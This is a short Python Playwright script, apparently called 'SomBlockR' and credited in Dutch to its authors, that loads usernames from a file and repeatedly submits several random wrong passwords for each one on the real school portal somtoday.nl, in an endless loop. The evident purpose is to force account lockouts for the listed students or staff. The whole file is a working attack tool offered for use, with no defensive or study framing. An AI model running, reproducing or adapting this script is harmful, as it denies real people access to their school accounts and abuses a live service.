import time
from playwright.sync_api import sync_playwright

print(r"""
  _________             __________.__                 __   __________
 /   _____/ ____   _____\______   \  |   ____   ____ |  | _\______   \
 \_____  \ /  _ \ /     \|    |  _/  |  /  _ \_/ ___\|  |/ /|       _/
 /        (  <_> )  Y Y  \    |   \  |_(  <_> )  \___|    < |    |   \
/_______  /\____/|__|_|  /______  /____/\____/ \___  >__|_ \|____|_  /
        \/             \/       \/                 \/     \/       \/
              ,        ,
             /(        )`
             \ \___   / |
             /- _  `-/  '
            (/\/ \ \   /\
            / /   | `    \
            O O   ) /    |
            `-^--'`<     '
           (_.)  _  )   /
            `.___/`    /
              `-----' /
 <----.     __ / __   \
 <----|====O)))==) \) /====
 <----'    `--' `.__,' \
              |        |
               \       /
          ______( (_  / \______
        ,'  ,-----'   |        \
        `--{__________)        \/

Gemaakt door levikoalakip1010, koolstof en spekkie
""")
print("-----" * 20)

def run():
    with open("user.txt", "r", encoding="utf-8") as f:
        usernames = [line.strip() for line in f if line.strip()]

    passwords = [
        "98fh3o8so3fjo8ols",
        "9fj983osofll83l",
        "893jf8oshlfj3wd",
        "3f9u9sp3ufw9uodfio3",
        "ifu38fowu39rlw3if",
    ]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        for username in usernames:
            page.goto("https://somtoday.nl", wait_until="domcontentloaded")

            org = page.locator("#organisatieSearchField")
            user = page.locator("#usernameField")
            pwd = page.locator("#password-field")

            org.fill("Organisatie")  # Fill your organization here
            org.press("Enter")

            user.fill(username)
            user.press("Enter")

            for pw in passwords:
                pwd.fill(pw)
                pwd.press("Enter")

        browser.close()


if __name__ == "__main__":
    while True:
        try:
            run()
            print("Lijst Klaar - Opnieuw")
            time.sleep(1)
        except Exception as e:
            print(f"Fout: {e}")
            time.sleep(1)
